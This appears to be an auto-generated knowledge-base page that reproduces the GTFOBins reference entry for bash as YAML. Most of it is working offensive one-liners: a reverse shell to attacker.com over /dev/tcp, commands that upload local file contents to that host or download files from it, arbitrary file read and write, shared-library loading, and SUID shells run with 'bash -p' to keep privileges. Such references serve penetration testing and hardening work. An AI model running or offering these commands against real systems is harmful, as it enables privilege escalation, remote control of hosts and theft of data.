---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# bash

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `bash` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bash` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [bash](../../tools/linux/bash.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | bash |
| name | bash |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/bash/ |

## Preserved Source Material

```yaml
_body: ''
_name: bash
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/bash
functions:
  download:
  - binary: false
    code: "bash -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3; }\
      \ \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break;\
      \ done; cat; } >/path/to/output-file'"
    contexts:
      sudo: null
      suid:
        code: "bash -p -c '{ echo -ne \"GET /path/to/input-file HTTP/1.0\\r\\nhost: attacker.com\\r\\n\\r\\n\" 1>&3; cat 0<&3;\
          \ } \\\n    3<>/dev/tcp/attacker.com/12345 \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\"\
          \ ] && break; done; cat; } >/path/to/output-file'"
      unprivileged: null
    sender: http-server
  - binary: false
    code: bash -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
    contexts:
      sudo: null
      suid:
        code: bash -p -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
      unprivileged: null
    sender: tcp-server
  file-read:
  - binary: false
    code: bash -c 'echo "$(</path/to/input-file)"'
    contexts:
      sudo: null
      suid:
        code: bash -p -c 'echo "$(</path/to/input-file)"'
      unprivileged: null
  - binary: false
    code: 'HISTTIMEFORMAT=$''\r\e[K''

      history -c

      history -r /path/to/input-file

      history'
    comment: This only works interactively from an existing `bash` session.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - code: bash -c 'echo DATA >/path/to/output-file'
    contexts:
      sudo: null
      suid:
        code: bash -p -c 'echo DATA >/path/to/output-file'
      unprivileged: null
  - binary: false
    code: 'HISTIGNORE=''history *''

      history -c

      DATA

      history -w /path/to/output-file'
    comment: This only works interactively from an existing `bash` session. It adds timestamps to the output file.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  library-load:
  - code: bash -c 'enable -f /path/to/lib.so x'
    contexts:
      sudo: null
      suid:
        code: bash -p -c 'enable -f /path/to/lib.so x'
      unprivileged: null
  reverse-shell:
  - code: bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'
    contexts:
      sudo: null
      suid:
        code: bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1'
      unprivileged: null
    listener: tcp-server
  shell:
  - code: bash
    contexts:
      sudo: null
      suid:
        code: bash -p
      unprivileged: null
  upload:
  - binary: false
    code: bash -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
    contexts:
      sudo: null
      suid:
        code: bash -p -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
      unprivileged: null
    receiver: http-server
  - binary: false
    code: bash -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
    contexts:
      sudo: null
      suid:
        code: bash -p -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
      unprivileged: null
    receiver: tcp-server
```
